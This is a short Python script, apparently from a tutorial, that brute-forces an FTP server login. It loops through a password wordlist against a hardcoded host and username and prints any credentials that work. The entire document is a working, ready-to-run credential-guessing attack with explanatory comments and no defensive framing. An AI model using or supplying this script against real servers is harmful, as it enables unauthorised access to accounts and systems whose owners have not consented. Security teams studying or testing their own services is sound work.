import ftplib
from colorama import Fore, init # for fancy colors, nothing else

# init the console for colors (for Windows)
init()
# hostname or IP address of the FTP server
host = "192.168.1.113"
# username of the FTP server, root as default for linux
user = "test"
# port of FTP, aka 21
port = 21

def is_correct(password):
    # initialize the FTP server object
    server = ftplib.FTP()
    print(f"[!] Trying", password)
    try:
        # tries to connect to FTP server with a timeout of 5
        server.connect(host, port, timeout=5)
        # login using the credentials (user & password)
        server.login(user, password)
    except ftplib.error_perm:
        # login failed, wrong credentials
        return False
    else:
        # correct credentials
        print(f"{Fore.GREEN}[+] Found credentials:", password, Fore.RESET)
        return True


# read the wordlist of passwords
passwords = open("wordlist.txt").read().split("\n")
print("[+] Passwords to try:", len(passwords))

# iterate over passwords one by one
# if the password is found, break out of the loop
for password in passwords:
    if is_correct(password):
        break